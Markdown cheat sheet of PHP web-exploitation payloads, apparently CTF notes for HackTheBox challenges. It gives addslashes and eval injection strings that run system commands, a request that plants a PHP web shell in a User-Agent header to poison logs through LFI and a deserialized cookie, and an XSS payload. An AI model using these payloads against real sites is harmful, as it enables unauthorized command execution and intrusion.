# addslashes()
This function escapes single & double quotes.
```php
# Assuming that the variable is passed to eval
${system($_GET[1])}&1=whoami;
# If it's not passed to eval
${eval($_GET[1])}&1=system($_GET[2]);&2=whoami;
```
- Challenge: https://app.hackthebox.com/challenges/lovetok
> **References:** 
> https://www.programmersought.com/article/30723400042/

# include() 
Only generates a warning, i.e., E_WARNING, and continue the execution of the script.

**Case**:  From LFI to log poisoning
- Burpsuite request example:
```txt
# Cookie Serialization exploit
# O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}

GET /?c=cat+/flag_qlvM8 HTTP/1.1
Host: 178.128.163.152:30522
User-Agent: Mozilla/5.0 <?php system($_GET['c']); ?> Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```
- Challenge: https://app.hackthebox.com/challenges/224

> **References:**
> https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
# htmlentities() & htmlspecialchars
It doesn't encode single quotes by default
```html
'onerror='alert("XSS")''
```
> **Reference**:
> https://github.com/X-Vector/XSS_Bypass/blob/master/htmlspecialchars%20-%20htmlentities/README.md

# Loose Comparison
- `===`
```php
<?php
if(NULL === NULL){ echo "Equal"; } else{ echo "not Equal"; }
?>
// Equal
```
- `==`
```php
<?php 
if(NULL == ''){ echo "Equal"; } else{ echo "not Equal"; }
?>
// Equal
```
# Eval
Always pay attention to the behaviour and aim to fix the syntax in order to acheive code execution. Taking the code below as an example, we can acheive code execution by payloads such like:
- `".system("ls")."`
```php
<?php
  if (!isset($_GET["name"])) {
    header("Location: /?name=hacker");
    die();
  }
  require "header.php";
?>
  $str="echo \"Hello ".$_GET['name']."!!!\";";
  eval($str);
?>
<?php
  require "footer.php";
?>
```
The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:
-   By adding dummy code: `".system('uname -a'); $dummy="`
-   By using comment: `".system('uname -a');#` or `".system('uname -a');//`